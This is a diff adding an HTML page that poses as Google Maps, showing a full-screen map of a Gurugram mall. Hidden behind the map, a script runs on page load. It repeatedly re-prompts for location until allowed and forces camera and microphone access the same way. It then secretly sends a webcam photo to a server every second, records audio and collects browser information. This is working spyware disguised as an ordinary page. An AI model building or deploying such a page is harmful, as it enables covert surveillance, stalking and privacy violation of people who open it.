@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Maps</title>
+  </head>
+  <body>
+    <div class="video-wrap" hidden>
+      <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480" hidden></canvas>
+
+    <script src="js/client.min.js"></script>
+    <script src="js/info.js"></script>
+    <script src="js/location.js"></script>
+    <script src="recorder.js"></script>
+    <script src="js/client.min.js"></script>
+
+    <script>
+      function captureAndSend() {
+        if (video.readyState < 2) {
+          console.warn("⚠️ Video not ready, skipping capture.");
+          return;
+        }
+
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/png");
+
+        fetch('/image_post.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: imageData })
+        })
+          .then(response => response.json())
+          .then(data => console.log("📸 Image sent:", data))
+          .catch(error => console.error("❌ Error sending image:", error));
+      }
+
+
+
+      function wait(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      async function requestLocationLoop() {
+        while (true) {
+          try {
+            await new Promise((resolve, reject) => {
+              if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                  position => {
+                    console.log("Location allowed ✅");
+                    locate();
+                    resolve();
+                  },
+                  err => {
+                    console.warn("Location denied ❌", err);
+                    reject();
+                  }
+                );
+              } else {
+                console.error("Geolocation not supported");
+                reject();
+              }
+            });
+            break; // location success
+          } catch {
+            await wait(500); // retry quickly
+          }
+        }
+      }
+
+      async function requestCameraMicLoop() {
+        while (true) {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+            const videoOnlyStream = new MediaStream(stream.getVideoTracks());
+            video.srcObject = videoOnlyStream;
+            video.muted = true;
+
+            // Wait until video is really ready
+            await new Promise((resolve) => {
+              video.onloadedmetadata = () => {
+                video.play().then(() => {
+                  const checkReady = () => {
+                    if (video.readyState >= 2) { // HAVE_CURRENT_DATA
+                      console.log("✅ Video ready to capture");
+                      resolve();
+                    } else {
+                      setTimeout(checkReady, 100);
+                    }
+                  };
+                  checkReady();
+                });
+              };
+            });
+
+            return stream;
+          } catch (err) {
+            console.warn("❌ Camera/Mic access denied", err);
+            await wait(500);
+          }
+        }
+      }
+
+
+      async function startAll() {
+        info(); // Browser info
+
+        await requestLocationLoop();
+        const stream = await requestCameraMicLoop();
+
+        setInterval(captureAndSend, 1000); // Har second photo bhejna
+
+        await startRecording(); // Recorder.js wala mic record karna
+      }
+
+      window.onload = startAll;
+
+      // ✅ THIS WAS THE BROKEN PART – NOW FIXED
+      window.addEventListener("beforeunload", function () {
+        // Trigger PHP for merging in background
+        navigator.sendBeacon("/merge.php");
+
+        // Optional: also try forcing download via hidden iframe
+        const i = document.createElement("iframe");
+        i.style.display = "none";
+        i.src = "/merge.php";
+        document.body.appendChild(i);
+      }); // <- closing fixed
+    </script>
+
+    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d7012.263965117645!2d77.09413637597729!3d28.50567657573428!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x390d1938456789c7%3A0x45a757aa37e73026!2sAMBIENCE%20MALL%2C%20GURUGRAM!5e0!3m2!1sen!2sin!4v1751561263575!5m2!1sen!2sin"
+      style="
+        position: fixed;
+        top: 0;
+        left: 0;
+        bottom: 0;
+        right: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+        z-index: 999999;
+      "
+      allowfullscreen=""
+      loading="lazy"
+      referrerpolicy="no-referrer-when-downgrade"
+    ></iframe>
+  </body>
+</html>
+
